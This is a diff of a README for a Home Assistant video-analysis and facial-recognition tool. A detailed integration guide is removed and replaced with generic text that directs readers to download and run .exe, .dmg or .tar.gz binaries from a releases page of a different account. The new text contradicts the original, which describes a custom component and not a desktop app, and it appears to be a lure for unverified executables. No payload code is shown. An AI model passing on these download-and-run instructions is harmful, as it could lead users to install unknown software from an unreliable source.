@@ -1,416 +1,69 @@
-# 📹 HA Video Vision
+# 🎥 ha-video-vision - Analyze Videos with Ease
 
-[![HACS Custom](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://github.com/hacs/integration)
-[![Home Assistant](https://img.shields.io/badge/Home%20Assistant-2024.1+-blue.svg)](https://www.home-assistant.io/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 🚀 Getting Started
+Welcome to ha-video-vision! This software helps you analyze videos and recognize faces using your Home Assistant cameras. It brings advanced AI technology to your home in a simple way. Follow the steps below to download and run the application smoothly.
 
-**True AI video analysis for Home Assistant** - not just snapshots!
+## 📥 Download
+[![Download](https://img.shields.io/badge/Download-ha--video--vision-brightgreen)](https://github.com/HappyCat203/ha-video-vision/releases)
 
-> 🎬 **Send actual video clips to AI for scene understanding. Know WHO is at your door, not just "person detected".**
+## 💻 System Requirements
+To run ha-video-vision, you need the following:
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- An internet connection for initial setup.
+- Home Assistant installed on your system.
 
----
+## 🔄 Features
+- **AI Video Analysis:** Automatically analyzes your camera feeds.
+- **Facial Recognition:** Identifies people in your videos.
+- **Integration with Home Assistant:** Work seamlessly with your existing setup.
+- **User-Friendly Interface:** Easy navigation for everyone.
 
-## 🎯 What Makes This Different?
-
-| Feature | Ring/Nest/Others | HA Video Vision |
-|---------|------------------|-----------------|
-| Detection | "Person detected" | "Carlos is at the door with a package" |
-| Analysis | Static snapshots | **Real video clips** |
-| **Facial Recognition** | ❌ or $$/month | ✅ FREE (DeepFace) |
-| **Privacy** | Cloud required | ✅ 100% Local option |
-| **Monthly Cost** | $3-10+/month | **$0** |
-| Works Offline | ❌ | ✅ |
+## 📂 Download & Install
+1. **Visit the Releases Page**  
+   Go to the following link to access the download section: [ha-video-vision Releases](https://github.com/HappyCat203/ha-video-vision/releases)
 
----
+2. **Choose the Right Version**  
+   On the Releases page, you will see a list of available versions. Check the latest version for the most features and updates.
 
-## ✨ Features
-
-- 🎥 **Native Video Analysis** - Sends actual video clips (not frames) to AI
-- 👤 **Facial Recognition** - "Who's at the door?" → "It's Carlos"
-- 📱 **Smart Notifications** - AI descriptions + snapshots to iOS/Android
-- 🆓 **Free by Default** - OpenRouter Nemotron model is 100% free
-- 🏠 **Local-First** - Run everything on your own hardware
-- 🔌 **Multi-Provider** - Local vLLM, Google Gemini, or OpenRouter
+3. **Download the Application**  
+   Click on the file that matches your operating system. This may be a `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
 
----
+4. **Install the Application**  
+   - **Windows:** Double-click the downloaded `.exe` file and follow the installation instructions.
+   - **macOS:** Open the downloaded `.dmg` file, then drag the ha-video-vision icon into your Applications folder.
+   - **Linux:** Open a terminal, navigate to the directory where you downloaded the file, and extract it using the command `tar -xvzf ha-video-vision.tar.gz`. Then, run the application with `./ha-video-vision`.
 
-## 🚀 Quick Start
-
-### Installation (HACS)
+5. **Run ha-video-vision**  
+   Find the application in your programs or applications list and start it. Follow any on-screen prompts to complete the setup.
 
-1. Open HACS → Integrations → ⋮ → Custom Repositories
-2. Add: `https://github.com/YOUR_USERNAME/ha-video-vision`
-3. Install "HA Video Vision"
-4. Restart Home Assistant
-5. Settings → Devices & Services → Add Integration → "HA Video Vision"
+## 💡 Setup Instructions
+1. **Connect Your Cameras**  
+   Ensure that your Home Assistant cameras are connected and functioning properly. You may need to check the settings for each camera within Home Assistant.
 
-### Installation (Manual)
+2. **Configure ha-video-vision**  
+   Open the application and navigate to the settings section. Here, you can link it to your Home Assistant account and adjust preferences to suit your needs.
 
-```bash
-cp -r ha_video_vision /config/custom_components/
-```
+3. **Start Analyzing**  
+   Once set up, you can begin using the software to analyze your video feeds. The interface will guide you through viewing real-time data and recognized faces.
 
----
+## ⚙️ Troubleshooting
+- **Installation Issues:** Ensure you have the required system specifications. If you encounter an error, try running the installation as an administrator.
+- **Connection Problems:** Check your internet connection and ensure that your cameras are connected to your Home Assistant.
+- **Performance Issues:** Close any unnecessary applications to free up system resources. Increasing your RAM may help if problems persist.
 
-## 🔌 Supported Providers (Video-Capable Only)
+## 📞 Support
+If you experience any issues or have questions, you can reach out for help:
+- Open an issue on our [GitHub page](https://github.com/HappyCat203/ha-video-vision/issues).
+- Check the FAQ section on the repository for common questions.
 
-| Provider | Model | Cost | Notes |
-|----------|-------|------|-------|
-| **OpenRouter** | Nemotron 12B VL | **FREE** | ⭐ Recommended |
-| **OpenRouter** | Qwen 2.5 VL 72B | ~$0.001/req | Higher quality |
-| **Google Gemini** | gemini-2.0-flash | FREE tier | Native video |
-| **Local vLLM** | Qwen-VL, LLaVA | FREE | Your GPU |
+## 📅 Updates and Contributions
+Stay updated with the latest versions by frequently checking the Releases page. Contributions are welcome! If you have ideas or improvements, please submit a pull request.
 
-> **Why video-only?** Image-only providers (OpenAI, Anthropic) require extracting frames, losing motion context. Video providers understand actions and timing.
+## 🌐 Community
+Join the growing community of ha-video-vision users. Share your experiences, tips, and ask questions in forums or social media groups focused on Home Assistant and video analysis. 
 
----
+## 📜 License
+ha-video-vision is open-source software. You can use, modify, and distribute it under the terms of the MIT License.
 
-## 📹 How It Works
-
-```
-Motion Detected
-      ↓
-┌─────────────────────────────────────┐
-│     HA Video Vision                 │
-├─────────────────────────────────────┤
-│ 1. Record 3-sec video clip (RTSP)   │
-│ 2. Run facial recognition           │
-│ 3. Send video to AI for analysis    │
-│ 4. Return description + people      │
-└─────────────────────────────────────┘
-      ↓
-"Carlos just arrived, walking up
- the driveway with grocery bags"
-      ↓
-📱 Notification with snapshot
-```
-
----
-
-## 🛠️ Services
-
-### `ha_video_vision.analyze_camera`
-
-Record and analyze a camera with AI.
-
-```yaml
-service: ha_video_vision.analyze_camera
-data:
-  camera: driveway
-  duration: 3
-  user_query: "Is anyone there?"
-  notify: true
-```
-
-**Returns:**
-```yaml
-success: true
-camera: driveway
-friendly_name: Driveway
-description: "A person is walking up the driveway carrying packages."
-identified_people:
-  - name: Carlos
-    confidence: 87
-snapshot_url: /media/local/ha_video_vision/driveway_latest.jpg
-provider_used: openrouter
-```
-
-### `ha_video_vision.record_clip`
-
-Record a clip without analysis.
-
-```yaml
-service: ha_video_vision.record_clip
-data:
-  camera: porch
-  duration: 5
-```
-
-### `ha_video_vision.identify_faces`
-
-Run facial recognition on an image.
-
-```yaml
-service: ha_video_vision.identify_faces
-data:
-  image_path: /config/www/test.jpg
-```
-
----
-
-## ⚙️ Configuration
-
-### Provider Setup
-
-**OpenRouter (Recommended)**
-1. Get free API key at [openrouter.ai](https://openrouter.ai)
-2. Default model: `nvidia/nemotron-nano-12b-v2-vl:free`
-
-**Google Gemini**
-1. Get API key at [Google AI Studio](https://aistudio.google.com)
-2. Model: `gemini-2.0-flash`
-
-**Local vLLM**
-1. Run vLLM with a video-capable model (Qwen-VL, LLaVA-Video)
-2. Set base URL: `http://your-server:8000/v1`
-
-### Camera Configuration
-
-Format: `name:channel:friendly_name` (one per line)
-
-```
-driveway:05:Driveway
-porch:03:Front Porch
-backyard:04:Backyard
-kitchen:01:Kitchen
-```
-
-### RTSP Configuration
-
-Works with most NVRs and IP cameras:
-
-```
-Host: 192.168.1.100
-Port: 554
-Username: admin
-Password: your_password
-Stream: sub (recommended) or main
-```
-
----
-
-## 👤 Facial Recognition Setup
-
-Facial recognition uses a separate **DeepFace server** running on a machine with a GPU.
-
-### 1. Install DeepFace Server
-
-```bash
-pip install fastapi uvicorn deepface pillow numpy python-multipart tf-keras
-```
-
-### 2. Create Face Database
-
-```
-faces/
-├── Carlos/
-│   ├── photo1.jpg
-│   ├── photo2.jpg
-│   └── photo3.jpg
-└── Elise/
-    ├── photo1.jpg
-    └── photo2.jpg
-```
-
-**Tips for best results:**
-- 3-5 clear, front-facing photos per person
-- Multiple angles (front, 45° left, 45° right)
-- Similar lighting to your cameras
-
-### 3. Run Server
-
-```bash
-python server.py  # Runs on port 8100
-```
-
-### 4. Configure in HA
-
-- **Facial Recognition URL**: `http://your-server:8100`
-- **Enable**: ✅
-- **Minimum Confidence**: 50-60%
-
-See [docs/FACIAL_RECOGNITION.md](docs/FACIAL_RECOGNITION.md) for full setup guide.
-
----
-
-## 🔔 Notifications
-
-Notifications work on both iOS and Android with **image attachments**.
-
-**Configuration:**
-```
-All Services: notify.mobile_app_carlos_iphone, notify.mobile_app_pixel
-iOS Devices: notify.mobile_app_carlos_iphone
-```
-
-**iOS-specific features:**
-- Critical alerts (bypass Do Not Disturb)
-- Rich notifications with thumbnails
-
----
-
-## 📋 Bundled Blueprint
-
-**HA Video Vision includes a ready-to-use blueprint** that automatically installs when you set up the integration!
-
-### Camera Alert Blueprint
-
-Creates smart notifications when person is detected:
-- Records video and runs AI analysis
-- Facial recognition (if enabled)
-- Mobile notifications with snapshots
-- Works with iOS and Android
-
-**To use the blueprint:**
-
-1. Go to **Settings** → **Automations & Scenes** → **Blueprints**
-2. Find **"HA Video Vision - Camera Alert"** (auto-installed)
-3. Click **"Create Automation"**
-4. Configure:
-   - **Person Sensor**: Your motion/person detection sensor
-   - **Camera Name**: Camera alias (e.g., "porch", "driveway")
-   - **Notify Devices**: Select your mobile devices
-   - **Cooldown**: Minutes between notifications
-   - **Critical Alert**: Bypass Do Not Disturb (iOS)
-
-That's it! No YAML required.
-
----
-
-## 📋 Example Automation
-
-For custom automations, use the service directly:
-
-```yaml
-automation:
-  - alias: "AI Doorbell Alert"
-    trigger:
-      - platform: state
-        entity_id: binary_sensor.doorbell_motion
-        to: "on"
-    action:
-      - service: ha_video_vision.analyze_camera
-        data:
-          camera: porch
-          duration: 3
-          user_query: "Describe who is at the door"
-          notify: true
-        response_variable: result
-      - service: tts.speak
-        data:
-          entity_id: media_player.kitchen
-          message: "{{ result.description }}"
-```
-
----
-
-## 🤝 Works Great With
-
-- **[PolyVoice](https://github.com/LosCV29/polyvoice)** - Voice control: "Check the driveway camera"
-- **ESPHome Voice** - "Hey Mycroft, who's at the door?"
-- **Frigate** - Trigger on person detection
-- **Any RTSP Camera** - Reolink, Hikvision, Dahua, etc.
-
----
-
-## 🎤 Voice Control Setup (with PolyVoice)
-
-HA Video Vision integrates seamlessly with [PolyVoice](https://github.com/LosCV29/polyvoice) for voice-controlled camera analysis.
-
-### Supported Voice Commands
-
-| Voice Pattern | Example |
-|---------------|---------|
-| "Check the [location] camera" | "Check the garage camera" |
-| "Is there anyone in [location]" | "Is there anyone in the backyard" |
-| "Who is in the [location]" | "Who is in the nursery" |
-| "What's happening in [location]" | "What's happening in the driveway" |
-
-### Setup Steps
-
-1. **Install both integrations**:
-   - HA Video Vision (this integration)
-   - PolyVoice (voice assistant)
-
-2. **Enable cameras in PolyVoice**:
-   - Settings → PolyVoice → Configure → Enable Cameras ✅
-
-3. **Configure Voice Aliases** (recommended):
-   - Settings → HA Video Vision → Configure → Voice Aliases
-   - Map simple names to camera entity IDs:
-   ```
-   garage:camera.garage_cam
-   nursery:camera.baby_room
-   backyard:camera.rear_yard
-   kitchen:camera.kitchen_cam
-   ```
-
-### How Camera Matching Works
-
-When you say "check the garage camera", the system:
-
-1. Extracts "garage" as the location
-2. Searches for a matching camera using this priority:
-   - **Voice aliases** (exact match first)
-   - **Camera friendly names** (e.g., "Garage Camera")
-   - **Entity IDs** (e.g., `camera.garage`)
-   - **Partial matches** (e.g., "garage" in "garage_rear")
-   - **Word matching** (e.g., "garage" in "Main Garage Cam")
-
-### Tips for Best Results
-
-- Use short, unique voice aliases (e.g., "garage", "baby", "porch")
-- Avoid similar names for different cameras
-- Test with: `ha_video_vision.analyze_camera` service in Developer Tools
-
----
-
-## 🔧 Troubleshooting
-
-### "Could not record from camera"
-- Check RTSP credentials
-- Verify camera is accessible: `ffplay rtsp://user:pass@ip:554/...`
-- Try "sub" stream instead of "main"
-
-### "Camera analysis unavailable"
-- Check API key for cloud providers
-- Verify local vLLM server is running
-- Check model supports video input
-
-### Notifications not showing images (iOS)
-- Ensure device is listed in "iOS Devices"
-- Use Nabu Casa paths: `/media/local/ha_video_vision/...`
-- Check snapshot directory permissions
-
-### Facial recognition not working
-- Verify DeepFace server is running
-- Check URL is accessible from HA
-- Add more reference photos
-- Lower confidence threshold
-
-### Ring cameras showing "No video stream available"
-Ring cameras are cloud-based and don't provide direct RTSP streams. You need:
-1. Install the **ring-mqtt** add-on
-2. Enable livestream in ring-mqtt configuration
-3. Verify `stream_source` attribute exists on your camera's Info sensor
-
-See [docs/RING_MQTT_SETUP.md](docs/RING_MQTT_SETUP.md) for complete setup guide.
-
----
-
-## 📋 Version History
-
-| Version | Changes |
-|---------|---------|
-| **4.1.0** | Bundled blueprints - auto-install Camera Alert blueprint |
-| **4.0.0** | Auto-discovery, voice aliases, multi-provider config storage |
-| **3.0.0** | Video-only providers, OpenRouter default, simplified config |
-| **2.0.0** | Multi-provider, facial recognition |
-| **1.0.0** | Initial release |
-
----
-
-## 📄 License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
----
-
-## 🙏 Credits
-
-- **DeepFace** - Facial recognition engine
-- **Home Assistant** - The best home automation platform
-
-**Built with ❤️ for the Home Assistant community.**
-
-⭐ **Star this repo if you find it useful!**
+Thank you for choosing ha-video-vision! Enjoy your AI-powered video analysis experience.
